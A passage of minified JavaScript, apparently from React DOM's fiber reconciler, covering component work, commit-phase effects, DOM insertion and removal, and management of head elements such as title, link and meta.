r===null&&xt&&((r=l=Yt)&&(l=_3(l,a.pendingProps,Ur),l!==null?(a.stateNode=l,ri=a,Yt=null,r=!0):r=!1),r||wo(a)),null;case 13:return yb(r,a,l);case 4:return gt(a,a.stateNode.containerInfo),u=a.pendingProps,r===null?a.child=Dl(a,null,u,l):On(r,a,u,l),a.child;case 11:return cb(r,a,a.type,a.pendingProps,l);case 7:return On(r,a,a.pendingProps,l),a.child;case 8:return On(r,a,a.pendingProps.children,l),a.child;case 12:return On(r,a,a.pendingProps.children,l),a.child;case 10:return u=a.pendingProps,na(a,a.type,u.value),On(r,a,u.children,l),a.child;case 9:return m=a.type._context,u=a.pendingProps.children,xo(a),m=Gn(m),u=u(m),a.flags|=1,On(r,a,u,l),a.child;case 14:return ub(r,a,a.type,a.pendingProps,l);case 15:return db(r,a,a.type,a.pendingProps,l);case 19:return _b(r,a,l);case 31:return u=a.pendingProps,l=a.mode,u={mode:u.mode,children:u.children},r===null?(l=Qh(u,l),l.ref=a.ref,a.child=l,l.return=a,a=l):(l=ps(r.child,u),l.ref=a.ref,a.child=l,l.return=a,a=l),a;case 22:return hb(r,a,l);case 24:return xo(a),u=Gn(mn),r===null?(m=gg(),m===null&&(m=Vt,y=mg(),m.pooledCache=y,y.refCount++,y!==null&&(m.pooledCacheLanes|=l),m=y),a.memoizedState={parent:u,cache:m},vg(a),na(a,mn,m)):((r.lanes&l)!==0&&(_g(r,a),pu(a,null,null,l),mu()),m=r.memoizedState,y=a.memoizedState,m.parent!==u?(m={parent:u,cache:u},a.memoizedState=m,a.lanes===0&&(a.memoizedState=a.updateQueue.baseState=m),na(a,mn,u)):(u=y.cache,na(a,mn,u),u!==m.cache&&fg(a,[mn],l,!0))),On(r,a,a.pendingProps.children,l),a.child;case 29:throw a.pendingProps}throw Error(i(156,a.tag))}function As(r){r.flags|=4}function bb(r,a){if(a.type!=="stylesheet"||(a.state.loading&4)!==0)r.flags&=-16777217;else if(r.flags|=16777216,!R1(a)){if(a=er.current,a!==null&&((ft&4194048)===ft?Br!==null:(ft&62914560)!==ft&&(ft&536870912)===0||a!==Br))throw hu=yg,r2;r.flags|=8192}}function Kh(r,a){a!==null&&(r.flags|=4),r.flags&16384&&(a=r.tag!==22?to():536870912,r.lanes|=a,jl|=a)}function xu(r,a){if(!xt)switch(r.tailMode){case"hidden":a=r.tail;for(var l=null;a!==null;)a.alternate!==null&&(l=a),a=a.sibling;l===null?r.tail=null:l.sibling=null;break;case"collapsed":l=r.tail;for(var u=null;l!==null;)l.alternate!==null&&(u=l),l=l.sibling;u===null?a||r.tail===null?r.tail=null:r.tail.sibling=null:u.sibling=null}}function Gt(r){var a=r.alternate!==null&&r.alternate.child===r.child,l=0,u=0;if(a)for(var m=r.child;m!==null;)l|=m.lanes|m.childLanes,u|=m.subtreeFlags&65011712,u|=m.flags&65011712,m.return=r,m=m.sibling;else for(m=r.child;m!==null;)l|=m.lanes|m.childLanes,u|=m.subtreeFlags,u|=m.flags,m.return=r,m=m.sibling;return r.subtreeFlags|=u,r.childLanes=l,a}function GR(r,a,l){var u=a.pendingProps;switch(cg(a),a.tag){case 31:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Gt(a),null;case 1:return Gt(a),null;case 3:return l=a.stateNode,u=null,r!==null&&(u=r.memoizedState.cache),a.memoizedState.cache!==u&&(a.flags|=2048),_s(mn),xi(),l.pendingContext&&(l.context=l.pendingContext,l.pendingContext=null),(r===null||r.child===null)&&(su(a)?As(a):r===null||r.memoizedState.isDehydrated&&(a.flags&256)===0||(a.flags|=1024,Jw())),Gt(a),null;case 26:return l=a.memoizedState,r===null?(As(a),l!==null?(Gt(a),bb(a,l)):(Gt(a),a.flags&=-16777217)):l?l!==r.memoizedState?(As(a),Gt(a),bb(a,l)):(Gt(a),a.flags&=-16777217):(r.memoizedProps!==u&&As(a),Gt(a),a.flags&=-16777217),null;case 27:Fn(a),l=he.current;var m=a.type;if(r!==null&&a.stateNode!=null)r.memoizedProps!==u&&As(a);else{if(!u){if(a.stateNode===null)throw Error(i(166));return Gt(a),null}r=Te.current,su(a)?Xw(a):(r=b1(m,u,l),a.stateNode=r,As(a))}return Gt(a),null;case 5:if(Fn(a),l=a.type,r!==null&&a.stateNode!=null)r.memoizedProps!==u&&As(a);else{if(!u){if(a.stateNode===null)throw Error(i(166));return Gt(a),null}if(r=Te.current,su(a))Xw(a);else{switch(m=lf(he.current),r){case 1:r=m.createElementNS("http://www.w3.org/2000/svg",l);break;case 2:r=m.createElementNS("http://www.w3.org/1998/Math/MathML",l);break;default:switch(l){case"svg":r=m.createElementNS("http://www.w3.org/2000/svg",l);break;case"math":r=m.createElementNS("http://www.w3.org/1998/Math/MathML",l);break;case"script":r=m.createElement("div"),r.innerHTML="<script><\/script>",r=r.removeChild(r.firstChild);break;case"select":r=typeof u.is=="string"?m.createElement("select",{is:u.is}):m.createElement("select"),u.multiple?r.multiple=!0:u.size&&(r.size=u.size);break;default:r=typeof u.is=="string"?m.createElement(l,{is:u.is}):m.createElement(l)}}r[le]=a,r[pe]=u;e:for(m=a.child;m!==null;){if(m.tag===5||m.tag===6)r.appendChild(m.stateNode);else if(m.tag!==4&&m.tag!==27&&m.child!==null){m.child.return=m,m=m.child;continue}if(m===a)break e;for(;m.sibling===null;){if(m.return===null||m.return===a)break e;m=m.return}m.sibling.return=m.return,m=m.sibling}a.stateNode=r;e:switch(jn(r,l,u),l){case"button":case"input":case"select":case"textarea":r=!!u.autoFocus;break e;case"img":r=!0;break e;default:r=!1}r&&As(a)}}return Gt(a),a.flags&=-16777217,null;case 6:if(r&&a.stateNode!=null)r.memoizedProps!==u&&As(a);else{if(typeof u!="string"&&a.stateNode===null)throw Error(i(166));if(r=he.current,su(a)){if(r=a.stateNode,l=a.memoizedProps,u=null,m=ri,m!==null)switch(m.tag){case 27:case 5:u=m.memoizedProps}r[le]=a,r=!!(r.nodeValue===l||u!==null&&u.suppressHydrationWarning===!0||m1(r.nodeValue,l)),r||wo(a)}else r=lf(r).createTextNode(u),r[le]=a,a.stateNode=r}return Gt(a),null;case 13:if(u=a.memoizedState,r===null||r.memoizedState!==null&&r.memoizedState.dehydrated!==null){if(m=su(a),u!==null&&u.dehydrated!==null){if(r===null){if(!m)throw Error(i(318));if(m=a.memoizedState,m=m!==null?m.dehydrated:null,!m)throw Error(i(317));m[le]=a}else au(),(a.flags&128)===0&&(a.memoizedState=null),a.flags|=4;Gt(a),m=!1}else m=Jw(),r!==null&&r.memoizedState!==null&&(r.memoizedState.hydrationErrors=m),m=!0;if(!m)return a.flags&256?(bs(a),a):(bs(a),null)}if(bs(a),(a.flags&128)!==0)return a.lanes=l,a;if(l=u!==null,r=r!==null&&r.memoizedState!==null,l){u=a.child,m=null,u.alternate!==null&&u.alternate.memoizedState!==null&&u.alternate.memoizedState.cachePool!==null&&(m=u.alternate.memoizedState.cachePool.pool);var y=null;u.memoizedState!==null&&u.memoizedState.cachePool!==null&&(y=u.memoizedState.cachePool.pool),y!==m&&(u.flags|=2048)}return l!==r&&l&&(a.child.flags|=8192),Kh(a,a.updateQueue),Gt(a),null;case 4:return xi(),r===null&&by(a.stateNode.containerInfo),Gt(a),null;case 10:return _s(a.type),Gt(a),null;case 19:if(ge(pn),m=a.memoizedState,m===null)return Gt(a),null;if(u=(a.flags&128)!==0,y=m.rendering,y===null)if(u)xu(m,!1);else{if(Qt!==0||r!==null&&(r.flags&128)!==0)for(r=a.child;r!==null;){if(y=Hh(r),y!==null){for(a.flags|=128,xu(m,!1),r=y.updateQueue,a.updateQueue=r,Kh(a,r),a.subtreeFlags=0,r=l,l=a.child;l!==null;)Ww(l,r),l=l.sibling;return ue(pn,pn.current&1|2),a.child}r=r.sibling}m.tail!==null&&Jn()>Xh&&(a.flags|=128,u=!0,xu(m,!1),a.lanes=4194304)}else{if(!u)if(r=Hh(y),r!==null){if(a.flags|=128,u=!0,r=r.updateQueue,a.updateQueue=r,Kh(a,r),xu(m,!0),m.tail===null&&m.tailMode==="hidden"&&!y.alternate&&!xt)return Gt(a),null}else 2*Jn()-m.renderingStartTime>Xh&&l!==536870912&&(a.flags|=128,u=!0,xu(m,!1),a.lanes=4194304);m.isBackwards?(y.sibling=a.child,a.child=y):(r=m.last,r!==null?r.sibling=y:a.child=y,m.last=y)}return m.tail!==null?(a=m.tail,m.rendering=a,m.tail=a.sibling,m.renderingStartTime=Jn(),a.sibling=null,r=pn.current,ue(pn,u?r&1|2:r&1),a):(Gt(a),null);case 22:case 23:return bs(a),Ag(),u=a.memoizedState!==null,r!==null?r.memoizedState!==null!==u&&(a.flags|=8192):u&&(a.flags|=8192),u?(l&536870912)!==0&&(a.flags&128)===0&&(Gt(a),a.subtreeFlags&6&&(a.flags|=8192)):Gt(a),l=a.updateQueue,l!==null&&Kh(a,l.retryQueue),l=null,r!==null&&r.memoizedState!==null&&r.memoizedState.cachePool!==null&&(l=r.memoizedState.cachePool.pool),u=null,a.memoizedState!==null&&a.memoizedState.cachePool!==null&&(u=a.memoizedState.cachePool.pool),u!==l&&(a.flags|=2048),r!==null&&ge(Ao),null;case 24:return l=null,r!==null&&(l=r.memoizedState.cache),a.memoizedState.cache!==l&&(a.flags|=2048),_s(mn),Gt(a),null;case 25:return null;case 30:return null}throw Error(i(156,a.tag))}function YR(r,a){switch(cg(a),a.tag){case 1:return r=a.flags,r&65536?(a.flags=r&-65537|128,a):null;case 3:return _s(mn),xi(),r=a.flags,(r&65536)!==0&&(r&128)===0?(a.flags=r&-65537|128,a):null;case 26:case 27:case 5:return Fn(a),null;case 13:if(bs(a),r=a.memoizedState,r!==null&&r.dehydrated!==null){if(a.alternate===null)throw Error(i(340));au()}return r=a.flags,r&65536?(a.flags=r&-65537|128,a):null;case 19:return ge(pn),null;case 4:return xi(),null;case 10:return _s(a.type),null;case 22:case 23:return bs(a),Ag(),r!==null&&ge(Ao),r=a.flags,r&65536?(a.flags=r&-65537|128,a):null;case 24:return _s(mn),null;case 25:return null;default:return null}}function xb(r,a){switch(cg(a),a.tag){case 3:_s(mn),xi();break;case 26:case 27:case 5:Fn(a);break;case 4:xi();break;case 13:bs(a);break;case 19:ge(pn);break;case 10:_s(a.type);break;case 22:case 23:bs(a),Ag(),r!==null&&ge(Ao);break;case 24:_s(mn)}}function Au(r,a){try{var l=a.updateQueue,u=l!==null?l.lastEffect:null;if(u!==null){var m=u.next;l=m;do{if((l.tag&r)===r){u=void 0;var y=l.create,A=l.inst;u=y(),A.destroy=u}l=l.next}while(l!==m)}}catch(S){Lt(a,a.return,S)}}function ca(r,a,l){try{var u=a.updateQueue,m=u!==null?u.lastEffect:null;if(m!==null){var y=m.next;u=y;do{if((u.tag&r)===r){var A=u.inst,S=A.destroy;if(S!==void 0){A.destroy=void 0,m=a;var U=l,J=S;try{J()}catch(se){Lt(m,U,se)}}}u=u.next}while(u!==y)}}catch(se){Lt(a,a.return,se)}}function Ab(r){var a=r.updateQueue;if(a!==null){var l=r.stateNode;try{u2(a,l)}catch(u){Lt(r,r.return,u)}}}function Eb(r,a,l){l.props=To(r.type,r.memoizedProps),l.state=r.memoizedState;try{l.componentWillUnmount()}catch(u){Lt(r,a,u)}}function Eu(r,a){try{var l=r.ref;if(l!==null){switch(r.tag){case 26:case 27:case 5:var u=r.stateNode;break;case 30:u=r.stateNode;break;default:u=r.stateNode}typeof l=="function"?r.refCleanup=l(u):l.current=u}}catch(m){Lt(r,a,m)}}function zr(r,a){var l=r.ref,u=r.refCleanup;if(l!==null)if(typeof u=="function")try{u()}catch(m){Lt(r,a,m)}finally{r.refCleanup=null,r=r.alternate,r!=null&&(r.refCleanup=null)}else if(typeof l=="function")try{l(null)}catch(m){Lt(r,a,m)}else l.current=null}function Tb(r){var a=r.type,l=r.memoizedProps,u=r.stateNode;try{e:switch(a){case"button":case"input":case"select":case"textarea":l.autoFocus&&u.focus();break e;case"img":l.src?u.src=l.src:l.srcSet&&(u.srcset=l.srcSet)}}catch(m){Lt(r,r.return,m)}}function Xg(r,a,l){try{var u=r.stateNode;f3(u,r.type,l,a),u[pe]=a}catch(m){Lt(r,r.return,m)}}function Cb(r){return r.tag===5||r.tag===3||r.tag===26||r.tag===27&&ya(r.type)||r.tag===4}function Zg(r){e:for(;;){for(;r.sibling===null;){if(r.return===null||Cb(r.return))return null;r=r.return}for(r.sibling.return=r.return,r=r.sibling;r.tag!==5&&r.tag!==6&&r.tag!==18;){if(r.tag===27&&ya(r.type)||r.flags&2||r.child===null||r.tag===4)continue e;r.child.return=r,r=r.child}if(!(r.flags&2))return r.stateNode}}function Jg(r,a,l){var u=r.tag;if(u===5||u===6)r=r.stateNode,a?(l.nodeType===9?l.body:l.nodeName==="HTML"?l.ownerDocument.body:l).insertBefore(r,a):(a=l.nodeType===9?l.body:l.nodeName==="HTML"?l.ownerDocument.body:l,a.appendChild(r),l=l._reactRootContainer,l!=null||a.onclick!==null||(a.onclick=of));else if(u!==4&&(u===27&&ya(r.type)&&(l=r.stateNode,a=null),r=r.child,r!==null))for(Jg(r,a,l),r=r.sibling;r!==null;)Jg(r,a,l),r=r.sibling}function Wh(r,a,l){var u=r.tag;if(u===5||u===6)r=r.stateNode,a?l.insertBefore(r,a):l.appendChild(r);else if(u!==4&&(u===27&&ya(r.type)&&(l=r.stateNode),r=r.child,r!==null))for(Wh(r,a,l),r=r.sibling;r!==null;)Wh(r,a,l),r=r.sibling}function Sb(r){var a=r.stateNode,l=r.memoizedProps;try{for(var u=r.type,m=a.attributes;m.length;)a.removeAttributeNode(m[0]);jn(a,u,l),a[le]=r,a[pe]=l}catch(y){Lt(r,r.return,y)}}var Es=!1,Zt=!1,ey=!1,Nb=typeof WeakSet=="function"?WeakSet:Set,xn=null;function QR(r,a){if(r=r.containerInfo,Ey=mf,r=Uw(r),Zp(r)){if("selectionStart"in r)var l={start:r.selectionStart,end:r.selectionEnd};else e:{l=(l=r.ownerDocument)&&l.defaultView||window;var u=l.getSelection&&l.getSelection();if(u&&u.rangeCount!==0){l=u.anchorNode;var m=u.anchorOffset,y=u.focusNode;u=u.focusOffset;try{l.nodeType,y.nodeType}catch{l=null;break e}var A=0,S=-1,U=-1,J=0,se=0,ce=r,te=null;t:for(;;){for(var ne;ce!==l||m!==0&&ce.nodeType!==3||(S=A+m),ce!==y||u!==0&&ce.nodeType!==3||(U=A+u),ce.nodeType===3&&(A+=ce.nodeValue.length),(ne=ce.firstChild)!==null;)te=ce,ce=ne;for(;;){if(ce===r)break t;if(te===l&&++J===m&&(S=A),te===y&&++se===u&&(U=A),(ne=ce.nextSibling)!==null)break;ce=te,te=ce.parentNode}ce=ne}l=S===-1||U===-1?null:{start:S,end:U}}else l=null}l=l||{start:0,end:0}}else l=null;for(Ty={focusedElem:r,selectionRange:l},mf=!1,xn=a;xn!==null;)if(a=xn,r=a.child,(a.subtreeFlags&1024)!==0&&r!==null)r.return=a,xn=r;else for(;xn!==null;){switch(a=xn,y=a.alternate,r=a.flags,a.tag){case 0:break;case 11:case 15:break;case 1:if((r&1024)!==0&&y!==null){r=void 0,l=a,m=y.memoizedProps,y=y.memoizedState,u=l.stateNode;try{var Fe=To(l.type,m,l.elementType===l.type);r=u.getSnapshotBeforeUpdate(Fe,y),u.__reactInternalSnapshotBeforeUpdate=r}catch(Le){Lt(l,l.return,Le)}}break;case 3:if((r&1024)!==0){if(r=a.stateNode.containerInfo,l=r.nodeType,l===9)Ny(r);else if(l===1)switch(r.nodeName){case"HEAD":case"HTML":case"BODY":Ny(r);break;default:r.textContent=""}}break;case 5:case 26:case 27:case 6:case 4:case 17:break;default:if((r&1024)!==0)throw Error(i(163))}if(r=a.sibling,r!==null){r.return=a.return,xn=r;break}xn=a.return}}function Rb(r,a,l){var u=l.flags;switch(l.tag){case 0:case 11:case 15:ua(r,l),u&4&&Au(5,l);break;case 1:if(ua(r,l),u&4)if(r=l.stateNode,a===null)try{r.componentDidMount()}catch(A){Lt(l,l.return,A)}else{var m=To(l.type,a.memoizedProps);a=a.memoizedState;try{r.componentDidUpdate(m,a,r.__reactInternalSnapshotBeforeUpdate)}catch(A){Lt(l,l.return,A)}}u&64&&Ab(l),u&512&&Eu(l,l.return);break;case 3:if(ua(r,l),u&64&&(r=l.updateQueue,r!==null)){if(a=null,l.child!==null)switch(l.child.tag){case 27:case 5:a=l.child.stateNode;break;case 1:a=l.child.stateNode}try{u2(r,a)}catch(A){Lt(l,l.return,A)}}break;case 27:a===null&&u&4&&Sb(l);case 26:case 5:ua(r,l),a===null&&u&4&&Tb(l),u&512&&Eu(l,l.return);break;case 12:ua(r,l);break;case 13:ua(r,l),u&4&&Db(r,l),u&64&&(r=l.memoizedState,r!==null&&(r=r.dehydrated,r!==null&&(l=n3.bind(null,l),w3(r,l))));break;case 22:if(u=l.memoizedState!==null||Es,!u){a=a!==null&&a.memoizedState!==null||Zt,m=Es;var y=Zt;Es=u,(Zt=a)&&!y?da(r,l,(l.subtreeFlags&8772)!==0):ua(r,l),Es=m,Zt=y}break;case 30:break;default:ua(r,l)}}function Ib(r){var a=r.alternate;a!==null&&(r.alternate=null,Ib(a)),r.child=null,r.deletions=null,r.sibling=null,r.tag===5&&(a=r.stateNode,a!==null&&Se(a)),r.stateNode=null,r.return=null,r.dependencies=null,r.memoizedProps=null,r.memoizedState=null,r.pendingProps=null,r.stateNode=null,r.updateQueue=null}var Ht=null,hi=!1;function Ts(r,a,l){for(l=l.child;l!==null;)kb(r,a,l),l=l.sibling}function kb(r,a,l){if(We&&typeof We.onCommitFiberUnmount=="function")try{We.onCommitFiberUnmount(bt,l)}catch{}switch(l.tag){case 26:Zt||zr(l,a),Ts(r,a,l),l.memoizedState?l.memoizedState.count--:l.stateNode&&(l=l.stateNode,l.parentNode.removeChild(l));break;case 27:Zt||zr(l,a);var u=Ht,m=hi;ya(l.type)&&(Ht=l.stateNode,hi=!1),Ts(r,a,l),Mu(l.stateNode),Ht=u,hi=m;break;case 5:Zt||zr(l,a);case 6:if(u=Ht,m=hi,Ht=null,Ts(r,a,l),Ht=u,hi=m,Ht!==null)if(hi)try{(Ht.nodeType===9?Ht.body:Ht.nodeName==="HTML"?Ht.ownerDocument.body:Ht).removeChild(l.stateNode)}catch(y){Lt(l,a,y)}else try{Ht.removeChild(l.stateNode)}catch(y){Lt(l,a,y)}break;case 18:Ht!==null&&(hi?(r=Ht,_1(r.nodeType===9?r.body:r.nodeName==="HTML"?r.ownerDocument.body:r,l.stateNode),zu(r)):_1(Ht,l.stateNode));break;case 4:u=Ht,m=hi,Ht=l.stateNode.containerInfo,hi=!0,Ts(r,a,l),Ht=u,hi=m;break;case 0:case 11:case 14:case 15:Zt||ca(2,l,a),Zt||ca(4,l,a),Ts(r,a,l);break;case 1:Zt||(zr(l,a),u=l.stateNode,typeof u.componentWillUnmount=="function"&&Eb(l,a,u)),Ts(r,a,l);break;case 21:Ts(r,a,l);break;case 22:Zt=(u=Zt)||l.memoizedState!==null,Ts(r,a,l),Zt=u;break;default:Ts(r,a,l)}}function Db(r,a){if(a.memoizedState===null&&(r=a.alternate,r!==null&&(r=r.memoizedState,r!==null&&(r=r.dehydrated,r!==null))))try{zu(r)}catch(l){Lt(a,a.return,l)}}function KR(r){switch(r.tag){case 13:case 19:var a=r.stateNode;return a===null&&(a=r.stateNode=new Nb),a;case 22:return r=r.stateNode,a=r._retryCache,a===null&&(a=r._retryCache=new Nb),a;default:throw Error(i(435,r.tag))}}function ty(r,a){var l=KR(r);a.forEach(function(u){var m=i3.bind(null,r,u);l.has(u)||(l.add(u),u.then(m,m))})}function Ri(r,a){var l=a.deletions;if(l!==null)for(var u=0;u<l.length;u++){var m=l[u],y=r,A=a,S=A;e:for(;S!==null;){switch(S.tag){case 27:if(ya(S.type)){Ht=S.stateNode,hi=!1;break e}break;case 5:Ht=S.stateNode,hi=!1;break e;case 3:case 4:Ht=S.stateNode.containerInfo,hi=!0;break e}S=S.return}if(Ht===null)throw Error(i(160));kb(y,A,m),Ht=null,hi=!1,y=m.alternate,y!==null&&(y.return=null),m.return=null}if(a.subtreeFlags&13878)for(a=a.child;a!==null;)Mb(a,r),a=a.sibling}var mr=null;function Mb(r,a){var l=r.alternate,u=r.flags;switch(r.tag){case 0:case 11:case 14:case 15:Ri(a,r),Ii(r),u&4&&(ca(3,r,r.return),Au(3,r),ca(5,r,r.return));break;case 1:Ri(a,r),Ii(r),u&512&&(Zt||l===null||zr(l,l.return)),u&64&&Es&&(r=r.updateQueue,r!==null&&(u=r.callbacks,u!==null&&(l=r.shared.hiddenCallbacks,r.shared.hiddenCallbacks=l===null?u:l.concat(u))));break;case 26:var m=mr;if(Ri(a,r),Ii(r),u&512&&(Zt||l===null||zr(l,l.return)),u&4){var y=l!==null?l.memoizedState:null;if(u=r.memoizedState,l===null)if(u===null)if(r.stateNode===null){e:{u=r.type,l=r.memoizedProps,m=m.ownerDocument||m;t:switch(u){case"title":y=m.getElementsByTagName("title")[0],(!y||y[je]||y[le]||y.namespaceURI==="http://www.w3.org/2000/svg"||y.hasAttribute("itemprop"))&&(y=m.createElement(u),m.head.insertBefore(y,m.querySelector("head > title"))),jn(y,u,l),y[le]=r,ut(y),u=y;break e;case"link":var A=S1("link","href",m).get(u+(l.href||""));if(A){for(var S=0;S<A.length;S++)if(y=A[S],y.getAttribute("href")===(l.href==null||l.href===""?null:l.href)&&y.getAttribute("rel")===(l.rel==null?null:l.rel)&&y.getAttribute("title")===(l.title==null?null:l.title)&&y.getAttribute("crossorigin")===(l.crossOrigin==null?null:l.crossOrigin)){A.splice(S,1);break t}}y=m.createElement(u),jn(y,u,l),m.head.appendChild(y);break;case"meta":if(A=S1("meta","content",m).get(u+(l.content||""))){for(S=0;S<A.length;S++)if(y=A[S],y.getAttribute("content")===(l.content==null?null:""+l.content)&&y.getAttribute("name")===(l.name==null?null:l.name)&&y.getAttribute("property")===(l.property==null?null:l.property)&&y.getAttribute("http-equiv")===(l.httpEquiv==null?null:l.httpEquiv)&&y.getAttribute("charset")===(l.charSet==null?null:l.charSet)){A.splice(S,1);break t}}y=m.createElement(u),jn(y,u,l),m.head.appendChild(y);break;default:throw Error(i(468,u))}y[le]=r,ut(y),u=y}r.stateNode=u}else N1(m,r.type,r.stateNode);else r.stateNode=C1(m,u,r.memoizedProps);else y!==u?(y===null?l.stateNode!==null&&(l=l.stateNode,l.parentNode.removeChild(l)):y.count--,u===null?N1(m,r.type,r.stateNode):C1(m,u,r.memoizedProps)):u===null&&r.stateNode!==null&&Xg(r,r.memoizedProps,l.memoizedProps)}break;case 27:Ri(a,r),Ii(r),u&512&&(Zt||l===null||zr(l,l.return)),l!==null&&u&4&&Xg(r,r.memoizedProps,l.memoizedProps);break;case 5:if(Ri(a,r),Ii(r),u&512&&(Zt||l===null||zr(l,l.return)),r.flags&32){m=r.stateNode;try{Yi(m,"")}catch(ne){Lt(r,r.return,ne)}}u&4&&r.stateNode!=null&&(m=r.memoizedProps,Xg(r,m,l!==null?l.memoizedProps:m)),u&1024&&(ey=!0);break;case 6:if(Ri(a,r),Ii(r),u&4){if(r.stateNode===null)throw Error(i(162));u=r.memoizedProps,l=r.stateNode;try{l.nodeValue=u}catch(ne){Lt(r,r.return,ne)}}break;case 3:if(df=null,m=mr,mr=cf(a.containerInfo),Ri(a,r),mr=m,Ii(r),u&4&&l!==null&&l.memoizedState.isDehydrated)try{zu(a.containerInfo)}catch(ne){Lt(r,r.return,ne)}ey&&(ey=!1,Ob(r));break;case 4:u=mr,mr=cf(r.stateNode.containerInfo),Ri(a,r),Ii(r),mr=u;break;case 12:Ri(a,r),Ii(r);break;case 13:Ri(a,r),Ii(r),r.child.flags&8192&&r.memoizedState!==null!=(l!==null&&l.memoizedState!==null)&&(oy=Jn()),u&4&&(u=r.updateQueue,u!==null&&(r.updateQueue=null,ty(r,u)));break;case 22:m=r.memoizedState!==null;var U=l!==null&&l.memoizedState!==null,J=Es,se=Zt;if(Es=J||m,Zt=se||U,Ri(a,r),Zt=se,Es=J,Ii(r),u&8192)e:for(a=r.stateNode,a._visibility=m?a._visibility&-2:a._visibility|1,m&&(l===null||U||Es||Zt||Co(r)),l=null,a=r;;){if(a.tag===5||a.tag===26){if(l===null){U=l=a;try{if(y=U.stateNode,m)A=y.style,typeof A.setProperty=="function"?A.setProperty("display","none","important"):A.display="none";else{S=U.stateNode;var ce=U.memoizedProps.style,te=ce!=null&&ce.hasOwnProperty("display")?ce.display:null;S.style.display=te==null||typeof te=="boolean"?"":(""+te).trim()}}catch(ne){Lt(U,U.return,ne)}}}else if(a.tag===6){if(l===null){U=a;try{U.stateNode.nodeValue=m?"":U.memoizedProps}catch(ne){Lt(U,U.return,ne)}}}else if((a.tag!==22&&a.tag!==23||a.memoizedState===null||a===r)&&a.child!==null){a.child.return=a,a=a.child;continue}if(a===r)break e;for(;a.sibling===null;){if(a.return===null||a.return===r)break e;l===a&&(l=null),a=a.return}l===a&&(l=null),a.sibling.return=a.return,a=a.sibling}u&4&&(u=r.updateQueue,u!==null&&(l=u.retryQueue,l!==null&&(u.retryQueue=null,ty(r,l))));break;case 19:Ri(a,r),Ii(r),u&4&&(u=r.updateQueue,u!==null&&(r.updateQueue=null,ty(r,u)));break;case 30:break;case 21:break;default:Ri(a,r),Ii(r)}}function Ii(r){var a=r.flags;if(a&2){try{for(var l,u=r.return;u!==null;){if(Cb(u)){l=u;break}u=u.return}if(l==null)throw Error(i(160));switch(l.tag){case 27:var m=l.stateNode,y=Zg(r);Wh(r,y,m);break;case 5:var A=l.stateNode;l.flags&32&&(Yi(A,""),l.flags&=-33);var S=Zg(r);Wh(r,S,A);break;case 3:case 4:var U=l.stateNode.containerInfo,J=Zg(r);Jg(r,J,U);break;default:throw Error(i(161))}}catch(se){Lt(r,r.return,se)}r.flags&=-3}a&4096&&(r.flags&=-4097)}function Ob(r){if(r.subtreeFlags&1024)for(r=r.child;r!==null;){var a=r;Ob(a),a.tag===5&&a.flags&1024&&a.stateNode.reset(),r=r.sibling}}function ua(r,a){if(a.subtreeFlags&8772)for(a=a.child;a!==null;)Rb(r,a.alternate,a),a=a.sibling}function Co(r){for(r=r.child;r!==null;){var a=r;switch(a.tag){case 0:case 11:case 14:case 15:ca(4,a,a.return),Co(a);break;case 1:zr(a,a.return);var l=a.stateNode;typeof l.componentWillUnmount=="function"&&Eb(a,a.return,l),Co(a);break;case 27:Mu(a.stateNode);case 26:case 5:zr(a,a.return),Co(a);break;case 22:a.memoizedState===null&&Co(a);break;case 30:Co(a);break;default:Co(a)}r=r.sibling}}function da(r,a,l){for(l=l&&(a.subtreeFlags&8772)!==0,a=a.child;a!==null;){var u=a.alternate,m=r,y=a,A=y.flags;switch(y.tag){case 0:case 11:case 15:da(m,y,l),Au(4,y);break;case 1:if(da(m,y,l),u=y,m=u.stateNode,typeof m.componentDidMount=="function")try{m.componentDidMount()}catch(J){Lt(u,u.return,J)}if(u=y,m=u.updateQueue,m!==null){var S=u.stateNode;try{var U=m.shared.hiddenCallbacks;if(U!==null)for(m.shared.hiddenCallbacks=null,m=0;m<U.length;m++)c2(U[m],S)}catch(J){Lt(u,u.return,J)}}l&&A&64&&Ab(y),Eu(y,y.return);break;case 27:Sb(y);case 26:case 5:da(m,y,l),l&&u===null&&A&4&&Tb(y),Eu(y,y.return);break;case 12:da(m,y,l);break;case 13:da(m,y,l),l&&A&4&&Db(m,y);break;case 22:y.memoizedState===null&&da(m,y,l),Eu(y,y.return);break;case 30:break;default:da(m,y,l)}a=a.sibling}}function ny(r,a){var l=null;r!==null&&r.memoizedState!==null&&r.memoizedState.cachePool!==null&&(l=r.memoizedState.cachePool.pool),r=null,a.memoizedState!==null&&a.memoizedState.cachePool!==null&&(r=a.memoizedState.cachePool.pool),r!==l&&(r!=null&&r.refCount++,l!=null&&cu(l))}function iy(r,a){r=null,a.alternate!==null&&(r=a.alternate.memoizedState.cache),a=a.memoizedState.cache,a!==r&&(a.refCount++,r!=null&&cu(r))}function Fr(r,a,l,u){if(a.subtreeFlags&10256)for(a=a.child;a!==null;)Pb(r,a,l,u),a=a.sibling}function Pb(r,a,l,u){var m=a.flags;switch(a.tag){case 0:case 11:case 15:Fr(r,a,l,u),m&2048&&Au(9,a);break;case 1:Fr(r,a,l,u);break;case 3:Fr(r,a,l,u),m&2048&&(r=null,a.alternate!==null&&(r=a.alternate.memoizedState.cache),a=a.memoizedState.cache,a!==r&&(a.refCount++,r!=null&&cu(r)));break;case 12:if(m&2048){Fr(r,a,l,u),r=a.stateNode;try{var y=a.memoizedProps,A=y.id,S=y.onPostCommit;typeof S=="function"&&S(A,a.alternate===null?"mount":"update",r.passiveEffectDuration,-0)}catch(U){Lt(a,a.return,U)}}else Fr(r,a,l,u);break;case 13:Fr(r,a,l,u);break;case 23:break;case 22:y=a.stateNode,A=a.alternate,a.memoizedState!==null?y._visibility&2?Fr(r,a,l,u):Tu(r,a):y._visibility&2?Fr(r,a,l,u):(y._visibility|=2,Ml(r,a,l,u,(a.subtreeFlags&10256)!==0)),m&2048&&ny(A,a);break;case 24:Fr(r,a,l,u),m&2048&&iy(a.alternate,a);break;default:Fr(r,a,l,u)}}function Ml(r,a,l,u,m){for(m=m&&(a.subtreeFlags&10256)!==0,a=a.child;a!==null;){var y=r,A=a,S=l,U=u,J=A.flags;switch(A.tag){case 0:case 11:case 15:Ml(y,A,S,U,m),Au(8,A);break;case 23:break;case 22:var se=A.stateNode;A.memoizedState!==null?se._visibility&2?Ml(y,A,S,U,m):Tu(y,A):(se._visibility|=2,Ml(y,A,S,U,m)),m&&J&2048&&ny(A.alternate,A);break;case 